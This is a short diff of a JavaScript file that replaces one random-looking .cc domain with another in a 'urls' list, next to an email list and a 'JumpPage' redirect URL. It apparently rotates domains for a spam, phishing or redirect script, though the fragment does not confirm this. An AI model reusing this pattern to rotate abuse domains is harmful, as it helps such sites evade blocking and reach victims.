@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'pbtlxxmj.cc', 
+	'pgkqjnow.cc', 
 ];                                                                                                                  
 
 var JumpPage="https://cgbgw.com";
